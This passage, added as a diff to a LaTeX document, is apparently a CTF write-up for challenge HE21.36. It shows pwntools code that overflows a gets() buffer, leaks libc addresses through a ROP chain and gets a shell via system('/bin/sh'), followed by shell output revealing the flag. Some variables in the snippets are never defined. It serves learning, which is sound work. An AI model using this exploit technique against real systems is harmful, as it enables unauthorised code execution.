@@ -1986,6 +1986,159 @@ Ubuntu 18.04 64 Bit
 \hypertarget{he21.36-solution}{%
 \subsection{HE21.36 Solution}\label{he21.36-solution}}
 
-\noindent 
+\noindent The binary prints a greeting, calls for user input and then prints
+parts of the poem.  Analysing with Ghidra, we see that the user input is done
+again with gets and can overflow the buffer.  Furthermore, we have functions
+\verb+puts+,\verb+system+, and \verb+printf+ available:
+
+\begin{minted}{c}
+undefined4 main(void)
+{
+  undefined4 pwn_me;
+  undefined local_9;
+  
+  pwn_me = 0;
+  local_9 = 0;
+  init_me_init_buffering();
+  ignore_me_init_signal();
+  puts("Welcome! Here is a nice rime of the poet Samuel Taylor Coleridge for you!");
+  puts("Please press a key to continue!\n");
+  gets((char *)&pwn_me);
+  system("/bin/cat ./heading");
+  puts("-------------------------------------------------------");
+  printf("%s%s%s%s%s%s%s%s%s\n\n%s\n",s_Hear_the_rime_of_the_ancient_mar_0804a060,
+         s_And_the_music_plays_on,_as_the_b_0804a120,s_Driven_south_to_the_land_of_the_s_0804a1a0,
+         s_And_the_ship_sails_on,_back_to_t_0804a260,s_The_mariner_kills_the_bird_of_go_0804a2c0,
+         s_Sailing_on_and_on_and_north_acro_0804a380,s_The_albatross_begins_with_its_ve_0804a3e0,
+         s_And_the_curse_goes_on_and_on_at_s_0804a480,s_"Day_after_day,_day_after_day_We_0804a4e0,
+         s_More_info?_https://en.wikipedia._0804a5c0);
+  return 0;
+}
+\end{minted}
+
+The plan is to leak addresses of functions, determine the version of the libc
+used and then use the \verb+/bin/sh+ from libc to create a shell using
+\verb+system+.
+
+After learning about pwntools from Adiber, I decided to build the exploit this
+way.  Some learning was needed, but in the end it was much easier than doing it
+by hand.  Determining the offset of the saved RIP as per the description in one
+of the many tutorials:
+
+\begin{verbatim}
+p.sendline(cyclic(100, n=4))
+p.interactive()
+\end{verbatim}
+
+gives the offset as the pattern \verb+aaae+, so we can use it afterwards to
+build exploit.
+
+Second step: leak the GOT-addresses of some functions to identify the version of libc.
+
+\begin{minted}{python}
+from pwn import *
+# Binary names
+bin_fname = './doldrums'
+
+# Remote
+IP = '46.101.107.117'
+PORT = 2113
+
+# Create ELF objects
+e = ELF(bin_fname)
+x64 = e.bits != 32
+
+cat = 0x0804888d
+main = 0x080485e6 # main is not known (obfuscated)
+
+print(p.recvuntil(b'Please press a key to continue!\n\n'))
+
+# Send payload one to leak address
+rop = ROP(bin_fname)
+rop.raw(cyclic(cyclic_find('aaae', n=4), n=4))
+rop.call(e.plt['puts'], [cat])
+rop.call(e.plt['puts'], [e.got['puts']])
+rop.call(e.plt['puts'], [cat])
+rop.call(e.plt['puts'], [e.got['printf']])
+rop.call(main)
+p.sendline(rop.chain())
+
+# skip the "poem"
+tmp = p.recvuntil(b'Ancient_Mariner\n\n')
+
+# Receive the GOT address of puts
+tmp = p.recvuntil(b'/bin/cat ./heading\n')
+leaked_puts = u32(p.recv(4))
+log.info('the leaked address of puts  : %s' % hex(leaked_puts))
+# Receive the GOT address of printf
+tmp = p.recvuntil(b'/bin/cat ./heading\n')
+leaked_printf = u32(p.recv(4))
+log.info('the leaked address of printf: %s' % hex(leaked_printf))
+\end{minted}
+
+The rop chain first prints a defined string, then the address of \verb+puts+,
+afterwards again the string and the address of \verb+printf+.  With the defined
+string we can identify the addresses in the buffer cleanly.  At the end of the
+exploit we call \verb+main+ again to get a chance to enter the second payload
+that will give us the shell.  This prints out the addresses of the two
+functions and we can use \url{https://libc.blukat.me/} to identify libc:
+
+\begin{figure}
+  \includegraphics[width=150mm]{ch36/identify_libc.png}
+    \caption{Identifying the libc.}
+\end{figure}
+
+Now we have all the information to build the second payload that will actuall
+create the shell.  We can use the offset of \verb+str_bin_sh+ in libc to get
+the shell:
+
+\begin{minted}{python}
+log.info("preparing second payload")
+rop2 = ROP(bin_fname)
+rop2.raw(cyclic(cyclic_find('aaae', n=4), n=4))
+rop2.call(e.plt['system'], [leaked_puts + off_str_bin_sh])
+print(p.recvuntil(b'Please press a key to continue!\n\n'))
+
+p.sendline(rop2.chain())
+log.info("second payload sent")
+
+print(p.recvuntil(b'Ancient_Mariner\n\n'))
+
+p.interactive()
+\end{minted}
+
+... and we have a shell ...
+\begin{verbatim}
+[* Switching to interactive mode
+$ ls
+challenge3
+flag
+heading
+ynetd
+$ ls -l
+total 36
+-rwxrwxr-x 1 root root  7048 Mar  3 12:10 challenge3
+-rwxrwxr-x 1 root root    25 Mar  3 12:10 flag
+-rw-rw-r-- 1 root root   607 Mar  3 12:10 heading
+-rwxrwxr-x 1 root root 18744 Mar  3 12:10 ynetd
+$ cat flag
+he2021{1nsp3ktorr_g4dg3t}
+$  
+\end{verbatim}
+
+\subsection{References used for ch36}
+\begin{itemize}
+    \item \url{https://docs.pwntools.com/en/stable/index.html}
+    \item \url{https://sidsbits.com/Defeating-ASLR-with-a-Leak/}
+    \item \url{https://github.com/B34nB01z/writeups/tree/master/2021/CyberApocalypse/system-drop}
+    \item \url{https://www.ret2rop.com/2020/04/got-address-leak-exploit-unknown-libc.html}
+    \item \url{https://libc.blukat.me/}
+\end{itemize}
+
+This finishes level eight and we reach the final level nine:
+
+\begin{figure}
+    \includegraphics[width=150mm]{images/phinisher.png}
+\end{figure}
 
 \end{document}
